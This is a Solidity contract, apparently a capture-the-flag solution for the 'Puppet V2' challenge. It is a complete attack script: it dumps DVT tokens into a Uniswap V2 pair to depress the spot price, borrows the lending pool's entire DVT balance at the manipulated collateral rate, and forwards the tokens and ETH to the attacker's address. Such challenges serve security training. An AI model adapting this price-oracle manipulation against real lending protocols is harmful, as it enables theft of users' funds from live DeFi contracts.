// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {UniswapV2Library} from "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import {PuppetV2Pool} from "./PuppetV2Pool.sol";
import {console} from "hardhat/console.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
}

interface WETH9 is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface UniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

contract PuppetV2Attacker {
    address private uniswapPair;
    address private uniswapFactory;
    address private uniswapRouter;
    address private dvt;
    address private weth;
    address private lendingPool;

    constructor(
        address _uniswapPair,
        address _uniswapFactory,
        address _uniswapRouter,
        address _dvt,
        address _weth,
        address _lendingPool
    ) public {
        uniswapPair = _uniswapPair;
        uniswapFactory = _uniswapFactory;
        uniswapRouter = _uniswapRouter;
        dvt = _dvt;
        weth = _weth;
        lendingPool = _lendingPool;
    }

    function attack(address player) public payable {
        console.log(
            "calculateDepositOfWETHRequired: %s",
            PuppetV2Pool(lendingPool).calculateDepositOfWETHRequired(
                IERC20(dvt).balanceOf(lendingPool)
            )
        );
        uint256 tokenBalance = IERC20(dvt).balanceOf(address(this));
        uint256 amountOut = getAmountWETHOut(tokenBalance);
        address[] memory path = new address[](2);
        path[0] = dvt;
        path[1] = weth;
        IERC20(dvt).approve(uniswapRouter, tokenBalance);
        UniswapV2Router02(uniswapRouter).swapExactTokensForTokens(
            tokenBalance,
            amountOut,
            path,
            address(this),
            block.timestamp
        );

        console.log(
            "                          weth: %s",
            IERC20(weth).balanceOf(address(this))
        );
        WETH9(weth).deposit{value: address(this).balance}();
        console.log(
            "                          weth: %s",
            IERC20(weth).balanceOf(address(this))
        );
        console.log(
            "calculateDepositOfWETHRequired: %s",
            PuppetV2Pool(lendingPool).calculateDepositOfWETHRequired(
                IERC20(dvt).balanceOf(lendingPool)
            )
        );
        IERC20(weth).approve(
            lendingPool,
            IERC20(weth).balanceOf(address(this))
        );
        PuppetV2Pool(lendingPool).borrow(IERC20(dvt).balanceOf(lendingPool));

        IERC20(weth).transfer(player, IERC20(weth).balanceOf(address(this)));
        IERC20(dvt).transfer(player, IERC20(dvt).balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }

    function getAmountWETHOut(uint dvtIn) public view returns (uint) {
        (uint256 reservesWETH, uint256 reservesDVT) = UniswapV2Library
            .getReserves(uniswapFactory, weth, dvt);
        return UniswapV2Library.getAmountOut(dvtIn, reservesDVT, reservesWETH);
    }
}
